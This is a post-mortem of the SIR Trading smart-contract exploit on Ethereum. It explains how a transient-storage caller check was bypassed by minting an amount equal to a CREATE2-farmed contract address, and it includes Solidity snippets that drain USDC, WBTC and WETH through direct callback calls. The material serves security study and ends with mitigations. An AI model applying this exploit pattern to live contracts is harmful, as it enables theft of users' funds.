---
title: SIR Trading
description: Attacking through misused transient storage security checks
type: Exploit
network: [ethereum]
date: 2025-03-30
loss_usd: 355000
returned_usd: 0
tags: [business logic, data validation, transient storage]
subcategory: []
vulnerable_contracts:
  - "0xb91ae2c8365fd45030aba84a4666c4db074e53e7"
tokens_lost:
  - USDC
  - WBTC
  - WETH
attacker_addresses:
  - "0x27defcfa6498f957918f407ed8a58eba2884768c"
malicious_token: []
attack_block: [22157900]
reproduction_command: forge test --match-contract Exploit_SIRTrading -vvv --evm-version cancun
attack_txs:
  - "0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f"
sources:
  - title: TenArmorAlert Twitter Thread
    url: https://x.com/TenArmorAlert/status/1906268185046745262
  - title: DecurityHQ Twitter Thread
    url: https://x.com/DecurityHQ/status/1906270316935942350
  - title: Slowmist Medium Post
    url: https://slowmist.medium.com/fatal-residue-an-on-chain-heist-triggered-by-transient-storage-10909e4a255a
---

## Step-by-step Overview

1. Deploy the ExploitCoordinator contract, which is also an ERC20 (TokenA), and mint tokens to itself
2. Deploy another ERC20 token (TokenB) and mint tokens to the ExploitCoordinator contract
3. Initialize a UniswapV3 pool with TokenA and TokenB, then provide liquidity
4. Create a new vault in the SIR Trading Vault contract(victim) using TokenA as collateral and TokenB as debt token
5. Call the Vault's mint function and retrieve the minted amount
6. Deploy an Exploit contract whose address (as uint256) matches the minted amount (via CREATE2 address farming)
7. Call uniswapV3Callback directly from the Exploit contract to bypass checks, transfer Vault funds, and pass control to ExploitCoordinator
8. Continue draining funds by calling uniswapV3Callback directly from the ExploitCoordinator with crafted data
9. Transfer stolen funds from the ExploitCoordinator contract to the attacker's EOA

## Detailed Description

Transient Storage is a data location type introduced in Ethereum to allow temporary data storage within the scope of a single transaction. Unlike persistent storage, which is retained across transactions, data stored with transient storage is automatically cleared when the transaction ends. It is designed to be a low-cost alternative for scenarios that involve frequent read/write operations within a transaction, offering significant gas savings.

However, its temporary nature can become a double-edged sword if not handled properly. In this exploit, the vulnerability arises from a permission check that relied on a transient value that was not handled correctly.

In this case, the bug comes from how transient storage was used in a function called `uniswapV3SwapCallback`. This function tries to verify that the call is coming from a legitimate Uniswap pool by using `TLOAD` to read from slot `0x1` and comparing it with `msg.sender`. At first glance, this looks fine, but there's a catch.

At the end of the function, it stores the value of the `amount` variable into that same slot (`0x1`) using `TSTORE`. Since `amount` is a value that the attacker can influence, the attacker just needed to find an `amount` that, when interpreted as a uint256, matches the address of a contract they control. That’s exactly what they did, allowing them to bypass the check and gain unauthorized access.

```solidity
function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
    // Check caller is the legit Uniswap pool
    address uniswapPool;
    assembly {
        uniswapPool := tload(1)
    }
    require(msg.sender == uniswapPool);

    //...

    uint256 amount = _mint(minter, ape, vaultParams, uint144(collateralToDeposit), vaultState, reserves);

    //...

    // Use the transient storage to return amount of tokens minted to the mint function
    assembly {
        tstore(1, amount)
    }
}
```

The attacker started by preparing the environment to trigger the vulnerability. This part of the exploit involves setting up tokens and liquidity so that the `Vault` contract can be tricked into minting an amount that matches a malicious contract’s address (interpreted as a uint256). This is crucial for bypassing the transient storage check later on.

The attacker first deployed a contract (`ExploitCoordinator`), which also acts as an ERC20 token (TokenA). This contract mints tokens to itself:

```solidity
_mint(address(this), 200000000000000000000000000000000000000000000000000);
```

Then, the attacker deployed a second token (TokenB), which is used as the debt token in the SIR Trading protocol:

```solidity
IToken tokenB = IToken(address(new Token()));
tokenB.mint(address(this), 200000000000000000000000000000000000000000000000000);
tokenB.approve(address(victim), 200000000000000000000000000000000000000000000000000);
```

Once both tokens were ready, the attacker created a Uniswap V3 pool for TokenA and TokenB. This step is necessary because the vulnerable contract interacts with Uniswap during the minting process. The attacker initialized the pool with a chosen price and provided liquidity using both tokens. This setup ensures that the vault will interact with the pool in the next step and allows the attacker to control token balances, prices, and parameters needed to manipulate the minted amount:

```solidity
// Initialize Uniswap V3 pool with TokenA and TokenB
positionManager.createAndInitializePoolIfNecessary(
    address(tokenB),
    address(this), // TokenA (ExploitCoordinator)
    100, // Fee tier
    79228162514264337593543950336 // sqrtPriceX96
);

// Approve token transfers to Uniswap
tokenB.approve(address(positionManager), 108823205127466839754387550950703);

IERC20(address(this)).approve(address(positionManager), 108823205127466839754387550957989);

// Provide liquidity to the Uniswap V3 pool
positionManager.mint(
    INonfungiblePositionManager.MintParams({
        token0: address(tokenB),
        token1: address(this),
        fee: 100,
        //...
    })
);
```

With the Uniswap pool and liquidity in place, the attacker moved on to the critical step: triggering the vulnerable `uniswapV3SwapCallback` and controlling the value stored in transient storage.

To do this, they called the `mint` function of the victim Vault contract, passing a specially chosen `amountToDeposit`. This value is used internally by the victim contract and eventually written into transient storage slot `0x1` as the return value of the `_mint` function, the same slot that is later read to verify the caller in `uniswapV3SwapCallback`.

The attacker’s goal was to ensure that the `tokensMinted` value, which ends up in slot `0x1`, matches the numeric value of an address they control. With this, they could later call `uniswapV3SwapCallback` directly from a contract deployed at that address, bypassing the pool verification check.

```solidity
uint256 tokensMinted = victim.mint(
    true, // isAPE
    vaultParams,
    amountToDeposit,
    1
);
```

After calling the `mint` function and getting a specific `tokensMinted` value written into transient storage, the attacker’s next move was to deploy a contract at an address that, when cast to uint256, matched `tokensMinted`. This was achieved using CREATE2, allowing the attacker to "farm" a specific address in advance.

To do this, the attacker used a keyless CREATE2 deployer, a common technique for deploying contracts at predictable addresses. By carefully crafting the bytecode and salt, they were able to generate a contract whose address matched the expected value

```solidity
bytes32 salt = 0; // Here the salt needs to be chosen based on the bytecode and the expected address
bytes memory bytecode = type(Exploit).creationCode;
address vanityAddress = factory.safeCreate2(salt, bytecode);

// vanityAddress should now equal tokensMinted casted to address
require(vanityAddress == address(uint160(tokensMinted)), "Address mismatch");
```

This contract, referred to as the Exploit contract, is now able to call `uniswapV3SwapCallback` and appear as a valid Uniswap pool in the eyes of the victim contract.

Next, the attacker uses this contract to hijack the flow of execution and start draining funds.

```solidity
IExploit exploitContract = IExploit(vanityAddress);
exploitContract.exploit(address(this));
```

Once the attacker had deployed the `Exploit` contract at the farmed address, the last phase of the exploit was to invoke the vulnerable `uniswapV3SwapCallback` function directly. Since the transient storage slot now matched the address of this contract, the internal `msg.sender` check passed.

Inside the `Exploit` contract, the attacker manually crafted the parameters expected by the callback. These were encoded into the data payload and passed to the callback to simulate a legitimate Uniswap swap operation.

The attacker targeted USDC (the debt token) as the asset to steal. They calculated the amount to drain by querying the balance held by the victim contract and then they then called the vulnerable function directly. The `Vault` contract incorrectly believed the call came from a valid pool, due to the transient storage slot still holding the farmed address. The callback logic proceeded and sent the USDC to the `Exploit` contract, and also shifted control to the `ExploitCoordinator` contract.

Finally, the attacker transferred the stolen USDC from the `Exploit` contract to the `ExploitCoordinator`, completing the drain:

```solidity
contract Exploit {

    //...

    function exploit(address exploitCoordinator) external {

        //...

        IVault.VaultParameters memory vaultParams = IVault.VaultParameters({
            debtToken: address(usdc),
            collateralToken: exploitCoordinator, // The address of TokenA and exploitCoordinator
            leverageTier: 0
        });

        bytes memory data = abi.encode(msg.sender, exploitCoordinator, vaultParams, vaultState, reserves, false, true);

        uint256 amountToSteal = usdc.balanceOf(address(victim));

        victim.uniswapV3SwapCallback(
            0,
            int256(amountToSteal),
            data
        );

        uint256 usdcBalance = usdc.balanceOf(address(this));
        usdc.transfer(exploitCoordinator, usdcBalance);
    }
}
```

This setup also allowed the `ExploitCoordinator` contract to repeat the callback using the same technique, enabling further draining rounds if desired.

The attacker prepared new `VaultParameters` structures, swapping out the debt token for other valuable assets like WBTC and WETH. With each new asset, they crafted a matching data payload and called `uniswapV3SwapCallback` directly again.

```solidity
IVault.VaultParameters memory vaultParamsWeth = IVault.VaultParameters({
    debtToken: address(weth),
    collateralToken: address(this),
    leverageTier: 0
});

data = abi.encode(msg.sender, address(this), vaultParamsWeth, vaultState, reserves, false, true);

uint256 wethBalanceVictim = weth.balanceOf(address(victim));
victim.uniswapV3SwapCallback(
    0,
    int256(wethBalanceVictim),
    data
);
```

## Possible mitigations

1. Use separate transient storage slots for different values. Don’t store both the pool address and the minted amount in the same slot.
2. Clear transient storage manually after performing critical checks, to avoid unintended reuse later in the transaction.
